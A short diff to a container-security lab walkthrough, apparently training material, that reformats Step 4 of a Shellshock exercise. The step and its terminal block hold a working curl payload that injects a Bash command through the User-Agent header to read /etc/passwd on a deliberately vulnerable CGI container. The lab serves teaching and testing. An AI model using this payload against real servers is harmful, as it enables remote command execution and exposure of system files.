@@ -29,8 +29,7 @@
 
 ##### Step 4:
 
-* Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
-http://localhost:8080/cgi-bin/vulnerable` to exploit the vulnerability and access the `/etc/passwd` file on the vulnerable container.
+* Run `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable` to exploit the vulnerability and access the `/etc/passwd` file on the vulnerable container.
 
 ```commandline
 root@we45:~/container_training/Container/Container-Attacks/Vulnerable-Libraries-ShellShock# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
